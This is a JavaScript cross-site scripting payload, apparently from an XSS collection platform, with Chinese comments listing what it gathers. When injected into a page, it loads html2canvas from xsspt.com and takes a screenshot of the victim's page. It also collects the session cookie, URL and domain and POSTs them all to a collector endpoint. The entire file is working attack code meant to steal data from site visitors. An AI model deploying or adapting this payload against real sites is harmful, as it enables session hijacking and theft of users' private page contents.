/**
 * 请求地址 \ cookie \当前屏幕截图\ 请求域名
 */

let head_screen = document.getElementsByTagName('head')[0]
let script_screen = document.createElement('script')
let xssInfo_screen = {
  img: null,
  cookie: null,
  domain: null,
  url: null,
}
script_screen.type = 'text/javascript'
script_screen.onload = script_screen.onreadystatechange = function () {
  if (window.onload == null) {
    setTimeout(ajax_xss, 1000)
  }
  window.onload = function () {
    this.ajax_xss()
  }
  //script_screen.onload = script_screen.onreadystatechange = null
}
script_screen.src = 'https://xsspt.com/js/html2canvas.js'
head_screen.appendChild(script_screen)

function ajax_xss () {
  html2canvas(document.body).then(canvas => {
    //document.body.appendChild(canvas);
    //console.log(canvas.toDataURL())
    //console.log(encodeURIComponent(canvas.toDataURL()))

    try {
      xssInfo_screen.img = escape(canvas.toDataURL())

    } catch (e) {
      console.log('截图异常！')
      xssInfo_screen.img = ''
    }
    try {
      xssInfo_screen.url = escape(document.location.href)
    } catch (e) {
      console.log('获取url异常！')
      xssInfo_screen.url = ''
    }
    try {
      xssInfo_screen.cookie = escape(document.cookie)
    } catch (e) {
      console.log('获取cookie异常！')
      xssInfo_screen.cookie = ''
    }

    try {
      xssInfo_screen.domain = escape(document.domain)
    } catch (e) {
      console.log('获取domain异常！')
      xssInfo_screen.domain = ''
    }

    let ajax = new XMLHttpRequest()
    ajax.open('POST', 'http://localhost:8001/api/xss/screen', true)
    ajax.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
    ajax.send(JSON.stringify(xssInfo_screen))
    ajax.onreadystatechange = function () {
      if (ajax.readyState == 4 && ajax.status == 200) {
        console.log('执行结果：' + ajax.responseText)
      }
    }

    // $.ajax({
    //   url: 'http://127.0.0.1:8998/api/xss/screen',
    //   type: 'POST',
    //   dataType: 'json',
    //   data: JSON.stringify(xssInfo),
    //   success: function (data) {
    //   }
    // })
  })
}
